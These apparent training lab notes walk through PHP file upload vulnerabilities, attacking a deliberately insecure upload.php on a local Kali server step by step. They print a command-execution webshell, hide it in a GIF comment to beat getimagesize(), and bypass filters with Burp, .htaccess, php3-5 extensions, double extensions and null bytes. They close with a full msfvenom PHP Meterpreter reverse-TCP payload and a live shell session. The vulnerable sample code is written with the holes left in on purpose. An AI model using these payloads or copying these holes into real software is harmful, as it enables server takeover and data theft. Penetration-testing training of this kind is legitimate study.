File Upload Vulnerability

**********************************************************************************************************************************

Attacker abuses a file upload feature to upload malicious script
Script is executed and allows for further attacks -> webshell
Filters based on Content-Type, Extension names, Size etc.

**********************************************************************************************************************************

PHP File Upload Reference
http://www.phpforkids.com/php/php-forms-file-uploads.php

**********************************************************************************************************************************

Set the permissions

$ chmod 777 uploads/

**********************************************************************************************************************************

Error Checking

upload.php just checks for errors in the file being uploaded

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

        if($_FILES["file"]["error"])
        {
                header("Location: file.html");
                die();
        }
        else{

                echo "Name: ".$_FILES["file"]["name"];
                echo "<br>Size: ".$_FILES["file"]["size"];
                echo "<br>Temp File: ".$_FILES["file"]["tmp_name"];

                move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/".$_FILES["file"]["name"]);
        }


?>

</body>
</html>
$

Upload simple-backdoor.php
http://localhost/file-upload-basic/file_upload/basic/uploads/simple-backdoor.php
Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
http://localhost/file-upload-basic/file_upload/basic/uploads/simple-backdoor.php?cmd=cat+/etc/passwd

**********************************************************************************************************************************

Content Type check

Common practice to check for Content-Types
Attacker can use an intercepting proxy and change the Content-Type to what is expected

upload.php checks for errors in the file being uploaded and also the content type

$ cat upload.php
<html>
<body>

<h3>GIF Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

if ($_FILES["file"]["type"] != "image/gif") {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]);
}


?>

</body>
</html>
$

In Burp
For GIF
Content-Disposition: form-data; name="file"; filename="action_back.gif"
Content-Type: image/gif

For backdoor
Content-Disposition: form-data; name="file"; filename="simple-backdoor.php"
Content-Type: application/x-php

Change to
Content-Disposition: form-data; name="file"; filename="simple-backdoor.php"
Content-Type: image/gif

In Browser
http://localhost/file_upload/content-type/uploads/simple-backdoor.php
http://localhost/file_upload/content-type/uploads/simple-backdoor.php?cmd=cat+/etc/passwd

**********************************************************************************************************************************

Bypass Blacklist

Required Condition to Bypass
AllowOverride is turned on to ALL
allows .htaccess to work

upload.php checks for errors in the file being uploaded and file name

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

$notAllowed = array(
    'php'
);

$splitFileName = explode(".", $_FILES["file"]["name"]);

$fileExtension = end($splitFileName);


if (in_array($fileExtension, $notAllowed)) {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]);
}


?>

</body>
</html>
$

In Browser
http://localhost/blacklist/file.html
Try uploading simple-backdoor.php
Please upload a GIF file

Rename the file
root@kali:/var/www/blacklist# cp /usr/share/webshells/php/simple-backdoor.php .
root@kali:/var/www/blacklist# ls
file.html  simple-backdoor.php  upload.php  uploads
root@kali:/var/www/blacklist# mv simple-backdoor.php simple-backdoor.PHP
root@kali:/var/www/blacklist# ls
file.html  simple-backdoor.PHP  upload.php  uploads
root@kali:/var/www/blacklist#

Upload successful
Try accessing the file
http://localhost/blacklist/uploads/simple-backdoor.PHP
Doesnt work

Change AllowOverride None to AllowOverride All in /etc/apache2/sites-available/default
root@kali:/var/www/blacklist# cat /etc/apache2/sites-available/default
<VirtualHost *:80>
        ServerAdmin webmaster@localhost

        DocumentRoot /var/www
        <Directory />
                Options FollowSymLinks
                AllowOverride None
        </Directory>
        <Directory /var/www/>
                Options Indexes FollowSymLinks MultiViews
                AllowOverride None
                Order allow,deny
                allow from all
        </Directory>

        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride None
                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>

        ErrorLog ${APACHE_LOG_DIR}/error.log

        # Possible values include: debug, info, notice, warn, error, crit,
        # alert, emerg.
        LogLevel warn

        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
root@kali:/var/www/blacklist#

Restart Apache
root@kali:/var/www/blacklist# service apache2 restart
[....] Restarting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
. ok
root@kali:/var/www/blacklist# cd /root/
root@kali:~# nano .htaccess
root@kali:~# cat .htaccess
AddType application/x-httpd-php PHP
root@kali:~#

Upload the .htaccess file
http://localhost/blacklist/file.html
.htaccess
root@kali:/var/www/blacklist/uploads# ls -a
.  ..  .htaccess  simple-backdoor.PHP

Now access the file
http://localhost/blacklist/uploads/simple-backdoor.PHP?cmd=cat+/etc/passwd

For other extensions
root@kali:/var/www/blacklist# mv simple-backdoor.php simple-backdoor.blah
root@kali:~# nano .htaccess
root@kali:~# cat .htaccess
AddType application/x-httpd-php blah
root@kali:~#

Upload the .htaccess file
http://localhost/blacklist/file.html
.htaccess
root@kali:/var/www/blacklist/uploads# ls -a
.  ..  .htaccess  simple-backdoor.PHP

Upload and access the file
http://localhost/blacklist/uploads/simple-backdoor.blah?cmd=cat+/etc/passwd

**********************************************************************************************************************************

Bypassing Blacklists using PHPx

php 3/4/5 are allowed extensions and supported by default

upload.php checks for errors in the file being uploaded and file name

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

$notAllowed = array(
    'php'
);

$splitFileName = explode(".", $_FILES["file"]["name"]);

$fileExtension = end($splitFileName);


if (in_array($fileExtension, $notAllowed)) {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]);
}


?>

</body>
</html>
$

root@kali:/var/www/blacklist# cat /etc/apache2/mods-available/php5.conf
<FilesMatch ".+\.ph(p[345]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    # Deny access to raw php sources by default
    # To re-enable it's recommended to enable access to the files
    # only in specific virtual host or directory
    Order Deny,Allow
    Deny from all
</FilesMatch>
# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.ph(p[345]?|t|tml|ps)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# Running PHP scripts in user directories is disabled by default
#
# To re-enable PHP in user directories comment the following lines
# (from <IfModule ...> to </IfModule>.) Do NOT set it to On as it
# prevents .htaccess files from disabling it.
<IfModule mod_userdir.c>
    <Directory /home/*/public_html>
        php_admin_value engine Off
    </Directory>
</IfModule>
root@kali:/var/www/blacklist# cd ~
root@kali:~# ls
Desktop  Documents  php-meter.php
root@kali:~# mkdir demos
root@kali:~# cp /usr/share/webshells/php/simple-backdoor.php ~/demos/
root@kali:~# cd demos/
root@kali:~/demos# ls
simple-backdoor.php
root@kali:~/demos# cp simple-backdoor.php simple-backdoor.php3
root@kali:~/demos# cp simple-backdoor.php simple-backdoor.php4
root@kali:~/demos# ls -lah
total 20K
drwxr-xr-x  2 root root 4.0K Oct 29 01:26 .
drwxr-xr-x 20 root root 4.0K Oct 29 01:26 ..
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php3
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php4
root@kali:~/demos# cp simple-backdoor.php simple-backdoor.php5
root@kali:~/demos# ls -lah
total 24K
drwxr-xr-x  2 root root 4.0K Oct 29 01:27 .
drwxr-xr-x 20 root root 4.0K Oct 29 01:26 ..
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php3
-rw-r--r--  1 root root  328 Oct 29 01:26 simple-backdoor.php4
-rw-r--r--  1 root root  328 Oct 29 01:27 simple-backdoor.php5
root@kali:~/demos#

Try uploading simple-backdoor.php but the upload files
Now try uploading simple-backdoor.php3 and it uploads successfully
http://localhost/blacklist/uploads/simple-backdoor.php3
http://localhost/blacklist/uploads/simple-backdoor.php3?cmd=cat+/etc/passwd
Now do the same for the other files.
http://localhost/blacklist/uploads/simple-backdoor.php4?cmd=cat+/etc/passwd
http://localhost/blacklist/uploads/simple-backdoor.php5?cmd=cat+/etc/passwd

No need to upload an .htaccess file like we did for the file with the blah extension

**********************************************************************************************************************************

Bypassing Whitelists using Double Extensions

http://httpd.apache.org/docs/2.2/mod/mod_mime.html

upload.php checks for errors in the file, file name, extension and mime type

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

$allowed = array(
    'gif'
);

$splitFileName = explode(".", $_FILES["file"]["name"]);

$fileExtension = end($splitFileName);


if ($_FILES["file"]["type"] != "image/gif" || !in_array($fileExtension, $allowed)) {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]);
}


?>

</body>
</html>
$

root@kali:~/demos# cp /usr/share/webshells/php/simple-backdoor.php .
root@kali:~/demos# ls
simple-backdoor.php
root@kali:~/demos# cp simple-backdoor.php simple-backdoor.gif
root@kali:~/demos# ls
simple-backdoor.gif  simple-backdoor.php
root@kali:~/demos#

In Browser
http://localhost/double_extension/file.html
Upload simple-backdoor.gif
Try executing the file http://localhost/double_extension/uploads/simple-backdoor.gif
Fails

Double Extension
root@kali:~/demos# cp simple-backdoor.php simple-backdoor.php.gif
root@kali:~/demos# ls
simple-backdoor.gif  simple-backdoor.php  simple-backdoor.php.gif
root@kali:~/demos#

In Browser
http://localhost/double_extension/file.html
Upload simple-backdoor.php.gif
Try executing the file http://localhost/double_extension/uploads/simple-backdoor.php.gif
Fails

Making the configuration insecure
Remove the $ on line 1
root@kali:~/demos# cat /etc/apache2/mods-available/php5.conf
<FilesMatch ".+\.ph(p[345]?|t|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    # Deny access to raw php sources by default
    # To re-enable it's recommended to enable access to the files
    # only in specific virtual host or directory
    Order Deny,Allow
    Deny from all
</FilesMatch>
# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.ph(p[345]?|t|tml|ps)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# Running PHP scripts in user directories is disabled by default
#
# To re-enable PHP in user directories comment the following lines
# (from <IfModule ...> to </IfModule>.) Do NOT set it to On as it
# prevents .htaccess files from disabling it.
<IfModule mod_userdir.c>
    <Directory /home/*/public_html>
        php_admin_value engine Off
    </Directory>
</IfModule>
root@kali:~/demos# apache2ctl restart
apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
root@kali:~/demos#

In Browser
http://localhost/double_extension/uploads/simple-backdoor.php.gif?cmd=cat+/etc/passwd

**********************************************************************************************************************************

Defeating Getimagesize() Checks

http://php.net/manual/en/function.getimagesize.php

upload.php checks for errors in the file, file name, size and extension

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

$allowed = array(
    'gif'
);

$splitFileName = explode(".", $_FILES["file"]["name"]);

$fileExtension = end($splitFileName);

$imageDetails = getimagesize($_FILES["file"]["tmp_name"]);

if (($imageDetails == FALSE) || !in_array($fileExtension, $allowed)) {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_FILES["file"]["name"]);
}


?>

</body>
</html>
$

Insecure php configuration
Remove $
root@kali:/var/www/getimagesize# nano /etc/apache2/mods-available/php5.conf
root@kali:/var/www/getimagesize# cat /etc/apache2/mods-available/php5.conf
<FilesMatch ".+\.ph(p[345]?|t|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    # Deny access to raw php sources by default
    # To re-enable it's recommended to enable access to the files
    # only in specific virtual host or directory
    Order Deny,Allow
    Deny from all
</FilesMatch>
# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.ph(p[345]?|t|tml|ps)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# Running PHP scripts in user directories is disabled by default
#
# To re-enable PHP in user directories comment the following lines
# (from <IfModule ...> to </IfModule>.) Do NOT set it to On as it
# prevents .htaccess files from disabling it.
<IfModule mod_userdir.c>
    <Directory /home/*/public_html>
        php_admin_value engine Off
    </Directory>
</IfModule>
root@kali:/var/www/getimagesize#
root@kali:/var/www/getimagesize# service apache2 restart
[....] Restarting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
 ... waiting apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
. ok
root@kali:/var/www/getimagesize#

In Browser
http://localhost/getimagesize/file.html
Upload simple-backdoor.gif
Content-Disposition: form-data; name="file"; filename="simple-backdoor.gif"
Content-Type: image/gif
Fails
Please upload a GIF file

root@kali:~/demos# cp ~/Desktop/action_back.gif .
root@kali:~/demos# ls
action_back.gif  simple-backdoor.gif  simple-backdoor.php
root@kali:~/demos#

Install gifsicle
root@kali:~/demos# gifsicle -h
'Gifsicle' manipulates GIF images. Its most common uses include combining
single images into animations, adding transparency, optimizing animations for
space, and printing information about GIFs.

Usage: gifsicle [OPTION | FILE | FRAME]...

Mode options: at most one, before any filenames.
  -m, --merge                   Merge mode: combine inputs, write stdout.
  -b, --batch                   Batch mode: modify inputs, write back to
                                same filenames.
  -e, --explode                 Explode mode: write N files for each input,
                                one per frame, to 'input.frame-number'.
  -E, --explode-by-name         Explode mode, but write 'input.name'.

General options: Also --no-OPTION for info and verbose.
  -I, --info                    Print info about input GIFs. Two -I's means
                                normal output is not suppressed.
      --color-info, --cinfo     --info plus colormap details.
      --extension-info, --xinfo --info plus extension details.
      --size-info, --sinfo      --info plus compression information.
  -V, --verbose                 Prints progress information.
  -h, --help                    Print this message and exit.
      --version                 Print version number and exit.
  -o, --output FILE             Write output to FILE.
  -w, --no-warnings             Don't report warnings.
      --no-ignore-errors        Quit on very erroneous input GIFs.
      --conserve-memory         Conserve memory at the expense of speed.
      --multifile               Support concatenated GIF files.

Frame selections:               #num, #num1-num2, #num1-, #name

Frame change options:
  --delete FRAMES               Delete FRAMES from input.
  --insert-before FRAME GIFS    Insert GIFS before FRAMES in input.
  --append GIFS                 Append GIFS to input.
  --replace FRAMES GIFS         Replace FRAMES with GIFS in input.
  --done                        Done with frame changes.

Image options: Also --no-OPTION and --same-OPTION.
  -B, --background COL          Make COL the background color.
      --crop X,Y+WxH, --crop X,Y-X2,Y2
                                Crop the image.
      --crop-transparency       Crop transparent borders off the image.
      --flip-horizontal, --flip-vertical
                                Flip the image.
  -i, --interlace               Turn on interlacing.
  -S, --logical-screen WxH      Set logical screen to WxH.
  -p, --position X,Y            Set frame position to (X,Y).
      --rotate-90, --rotate-180, --rotate-270, --no-rotate
                                Rotate the image.
  -t, --transparent COL         Make COL transparent.

Extension options:
      --app-extension N D       Add an app extension named N with data D.
  -c, --comment TEXT            Add a comment before the next frame.
      --extension N D           Add an extension number N with data D.
  -n, --name TEXT               Set next frame's name.
      --no-comments, --no-names, --no-extensions
                                Remove comments (names, extensions) from input.
Animation options: Also --no-OPTION and --same-OPTION.
  -d, --delay TIME              Set frame delay to TIME (in 1/100sec).
  -D, --disposal METHOD         Set frame disposal to METHOD.
  -l, --loopcount[=N]           Set loop extension to N (default forever).
  -O, --optimize[=LEVEL]        Optimize output GIFs.
  -U, --unoptimize              Unoptimize input GIFs.

Whole-GIF options: Also --no-OPTION.
      --careful                 Write larger GIFs that avoid bugs in other
                                programs.
      --change-color COL1 COL2  Change COL1 to COL2 throughout.
  -k, --colors N                Reduce the number of colors to N.
      --color-method METHOD     Set method for choosing reduced colors.
  -f, --dither                  Dither image after changing colormap.
      --gamma G                 Set gamma for color reduction [2.2].
      --resize WxH              Resize the output GIF to WxH.
      --resize-width W          Resize to width W and proportional height.
      --resize-height H         Resize to height H and proportional width.
      --resize-fit WxH          Resize if necessary to fit within WxH.
      --scale XFACTOR[xYFACTOR] Scale the output GIF by XFACTORxYFACTOR.
      --resize-method METHOD    Set resizing method.
      --resize-colors N         Resize can add new colors up to N.
      --transform-colormap CMD  Transform each output colormap by shell CMD.
      --use-colormap CMAP       Set output GIF's colormap to CMAP, which can
                                be 'web', 'gray', 'bw', or a GIF file.

Report bugs to <ekohler@gmail.com>.
Too much information? Try 'gifsicle --help | more'.
root@kali:~/demos#

Adding comments
root@kali:~/demos# strings action_back.gif
GIF89a
*p\p
D$
root@kali:~/demos# gifsicle --comment "<?php echo 'Hacked' ?>" < action_back.gif > action_back.php.gif
root@kali:~/demos# ls
action_back.gif  action_back.php.gif  simple-backdoor.gif  simple-backdoor.php
root@kali:~/demos# strings action_back.php.gif
GIF89a
<?php echo 'Hacked' ?>
*p\p
D$
root@kali:~/demos#

In Browser
http://localhost/getimagesize/file.html
Upload the action_back.php.gif file
Success
Now access the file
http://localhost/getimagesize/uploads/action_back.php.gif

Exploit
root@kali:~/demos# cat simple-backdoor.php
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
root@kali:~/demos# tr '\n' ' ' < simple-backdoor.php
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->  <?php  if(isset($_REQUEST['cmd'])){         echo "<pre>";         $cmd = ($_REQUEST['cmd']);         system($cmd);         echo "</pre>";         die; }  ?>  Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd  <!--    http://michaeldaw.org   2006    --> root@kali:~/demos#
root@kali:~/demos# gifsicle --comment "` tr '\n' ' ' < simple-backdoor.php `" < action_back.gif > action_back.php.gif
root@kali:~/demos# strings action_back.php.gif
GIF89a
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->  <?php  if(isset($_REQUEST['cmd'])){         echo "<pre>";         $cmd = ($_REQUEST['cmd']);         system($cmd);         echo "</pre>";         die; }  ?>  Usage: http://target.com/simple-backdIoor.php?cmd=cat+/etc/passwd  <!--    http://michaeldaw.org   2006    -->
*p\p
D$
root@kali:~/demos# rm /var/www/getimagesize/uploads/action_back.php.gif
root@kali:~/demos#

In Browser
http://localhost/getimagesize/uploads/action_back.php.gif?cmd=cat+/etc/passwd
http://localhost/getimagesize/uploads/action_back.php.gif?cmd=pwd

**********************************************************************************************************************************

Null Byte Injection

Does not require multiple extension support in php configuration

upload.php checks for errors in the file, file name, size and extension

$ cat upload.php
<html>
<body>

<h3>Image File Upload Stats: </h3>

<?php

if ($_FILES["file"]["error"]) {
    header("Location: file.html");
    die();
}

$allowed = array(
    'gif'
);

$splitFileName = explode(".", $_POST["name"]);

$fileExtension = end($splitFileName);
$imageDetails  = getimagesize($_FILES["file"]["tmp_name"]);

if (($imageDetails == FALSE) || !in_array($fileExtension, $allowed)) {
    echo "Please upload a GIF file";
} else {

    echo "Name: " . $_FILES["file"]["name"];
    echo "<br>Size: " . $_FILES["file"]["size"];
    echo "<br>Temp File: " . $_FILES["file"]["tmp_name"];
    echo "<br>Type: " . $_FILES["file"]["type"];

    move_uploaded_file($_FILES["file"]["tmp_name"], "uploads/" . $_POST["name"]);
}

?>

</body>
</html>
$

Make the configuration secure
root@kali:~# nano /etc/apache2/mods-available/php5.conf
root@kali:~# cat /etc/apache2/mods-available/php5.conf
<FilesMatch ".+\.ph(p[345]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
<FilesMatch ".+\.phps$">
    SetHandler application/x-httpd-php-source
    # Deny access to raw php sources by default
    # To re-enable it's recommended to enable access to the files
    # only in specific virtual host or directory
    Order Deny,Allow
    Deny from all
</FilesMatch>
# Deny access to files without filename (e.g. '.php')
<FilesMatch "^\.ph(p[345]?|t|tml|ps)$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# Running PHP scripts in user directories is disabled by default
#
# To re-enable PHP in user directories comment the following lines
# (from <IfModule ...> to </IfModule>.) Do NOT set it to On as it
# prevents .htaccess files from disabling it.
<IfModule mod_userdir.c>
    <Directory /home/*/public_html>
        php_admin_value engine Off
    </Directory>
</IfModule>
root@kali:~#
root@kali:~# service apache2 restart
[....] Restarting web server: apache2apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName
. ok
root@kali:~#

root@kali:~/Desktop# cd workbench/
root@kali:~/Desktop/workbench# ls
action_back.gif
root@kali:~/Desktop/workbench# cp /usr/share/webshells/php/simple-backdoor.php .
root@kali:~/Desktop/workbench# gifsicle --comment "`tr '\n' ' ' < simple-backdoor.php`" < action_back.gif > action_back_out.gif
root@kali:~/Desktop/workbench# strings action_back.gif
GIF89a
*p\p
D$
root@kali:~/Desktop/workbench# strings action_back_out.gif
GIF89a
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->  <?php  if(isset($_REQUEST['cmd'])){         echo "<pre>";         $cmd = ($_REQUEST['cmd']);         system($cmd);         echo "</pre>";         die; }  ?>  Usage: http://target.com/simple-backdIoor.php?cmd=cat+/etc/passwd  <!--    http://michaeldaw.org   2006    -->
*p\p
D$
root@kali:~/Desktop/workbench#

Upload the file action_back_out.gif
http://localhost/null_byte/file.html
File get uploaded but doesn't get executed

In Burp
Rename the file to demo.phpA.gif
Change the A in hex to 00 and upload
41 to 00

In Browser
http://localhost/null_byte/uploads/demo.php
http://localhost/null_byte/uploads/demo.php?cmd=cat+/etc/passwd

**********************************************************************************************************************************

File Upload to Meterpreter

Create PHP Meterpreter
Upload using File Upload Vulnerability
Setup handler on Attacker machine

root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.19 -f raw > meterpreter.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
root@kali:~# ls
demos  Desktop  Documents  Downloads  meterpreter.php  php-meter.php
root@kali:~# nano meterpreter.php
root@kali:~# cat meterpreter.php
<?php

error_reporting(0);
# The payload handler overwrites this with the correct LHOST before sending
# it to the victim.
$ip = '192.168.2.19';
$port = 4444;
$ipf = AF_INET;

if (FALSE !== strpos($ip, ":")) {
        # ipv6 requires brackets around the address
        $ip = "[". $ip ."]";
        $ipf = AF_INET6;
}

if (($f = 'stream_socket_client') && is_callable($f)) {
        $s = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
} elseif (($f = 'fsockopen') && is_callable($f)) {
        $s = $f($ip, $port);
        $s_type = 'stream';
} elseif (($f = 'socket_create') && is_callable($f)) {
        $s = $f($ipf, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) { die(); }
        $s_type = 'socket';
} else {
        die('no socket funcs');
}
if (!$s) { die('no socket'); }

switch ($s_type) {
case 'stream': $len = fread($s, 4); break;
case 'socket': $len = socket_read($s, 4); break;
}
if (!$len) {
        # We failed on the main socket.  There's no way to continue, so
        # bail
        die();
}
$a = unpack("Nlen", $len);
$len = $a['len'];

$b = '';
while (strlen($b) < $len) {
        switch ($s_type) {
        case 'stream': $b .= fread($s, $len-strlen($b)); break;
        case 'socket': $b .= socket_read($s, $len-strlen($b)); break;
        }
}

# Set up the socket for the main stage to use.
$GLOBALS['msgsock'] = $s;
$GLOBALS['msgsock_type'] = $s_type;
eval($b);
die();
root@kali:~#

Upload the file
http://localhost/file_upload/basic/file.html
Access the file
http://localhost/file_upload/basic/uploads/

In MSF
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.2.19
LHOST => 192.168.2.19
msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.2.19:4444
[*] Starting the payload handler...
[*] Sending stage (40499 bytes) to 192.168.2.19
[*] Meterpreter session 1 opened (192.168.2.19:4444 -> 192.168.2.19:35337) at 2015-10-29 19:51:02 -0400

meterpreter >
meterpreter > getuid
Server username: www-data (33)
meterpreter > pwd
/var/www/file_upload/basic/uploads
meterpreter > ls

Listing: /var/www/file_upload/basic/uploads
===========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  266   fil   2015-10-29 19:44:51 -0400  action_back.gif
100644/rw-r--r--  1314  fil   2015-10-29 19:48:55 -0400  meterpreter.php

meterpreter > shell
Process 18609 created.
Channel 0 created.
uname -a
Linux kali 3.18.0-kali3-586 #1 Debian 3.18.6-1~kali2 (2015-03-02) i686 GNU/Linux

**********************************************************************************************************************************
